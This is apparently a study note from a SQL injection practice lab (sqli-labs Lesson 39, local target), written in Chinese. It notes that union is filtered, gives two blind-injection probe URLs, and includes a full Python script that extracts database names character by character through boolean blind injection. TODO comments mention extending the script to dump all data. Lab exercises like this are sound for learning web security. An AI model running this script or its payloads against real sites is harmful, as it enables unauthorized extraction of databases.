# Lesson-39
```
Bool盲注
```

这里union被过滤
双写不能绕过 , 大小写混写也不行 , 但是发现可以使用CHAR函数 , 可以利用这个函数对数据库进行注入
//TODO 如何使用CHAR拖库

---
其他思路 : 
盲注验证 : 
```
http://127.0.0.1/Less-39/?id=0|(1)
http://127.0.0.1/Less-39/?id=0|(0)
```
盲注脚本 : 
还是以前的脚本 , 稍微改了改
// TODO 将脚本再改改 , 当查询所有的数据库名以后提示用户选择是否继续查询其他数据 
// 或者直接就自动dump所有数据(可以过滤掉`information_schema`等系统数据库)
```
#!/usr/bin/env python
# encoding:utf8

import requests
import time
import sys

# config-start
sleep_time = 5
error_time = 1
# config-end

def getPayload(indexOfResult, indexOfChar, mid):
	column_name="schema_name"
	table_name="schemata"
	database_name="information_schema"
	startStr = "0|("
	endStr = ")"
	payload = "((ascii(substring((select " + column_name + " from " + database_name + "." + table_name + "  limit " + indexOfResult + ",1)," + indexOfChar + ",1)))>" + mid + ")"
	payload = startStr + payload + endStr
	return payload

def exce(indexOfResult,indexOfChar,mid):
	# content-start
	url = "http://127.0.0.1/Less-39/?id="
	tempurl = url + getPayload(indexOfResult,indexOfChar,mid)
	content = requests.get(tempurl).text
	# content-end
	# judge-start
	if "Your Username is :" in content:
		return True
	else:
		return False
	# judge-end

def doubleSearch(indexOfResult,indexOfChar,left_number, right_number):
	while left_number < right_number:
		mid = int((left_number + right_number) / 2)
		if exce(str(indexOfResult),str(indexOfChar + 1),str(mid)):
			left_number = mid
		else:
			right_number = mid
		if left_number == right_number - 1:
			if exce(str(indexOfResult),str(indexOfChar + 1),str(mid)):
				mid += 1
				break
			else:
				break
	return chr(mid)

def search():
	for i in range(32): # 需要遍历的查询结果的数量
		counter = 0
		for j in range(32): # 结果的长度
			counter += 1
			temp = doubleSearch(i, j, 0, 128) # 从255开始查询
			if ord(temp) == 1: # 当为1的时候说明已经查询结束
			    break
			sys.stdout.write(temp)
			sys.stdout.flush()
		if counter == 1: # 当结果集的所有行都被遍历后退出
			break
		sys.stdout.write("\r\n")
		sys.stdout.flush()

search()
```
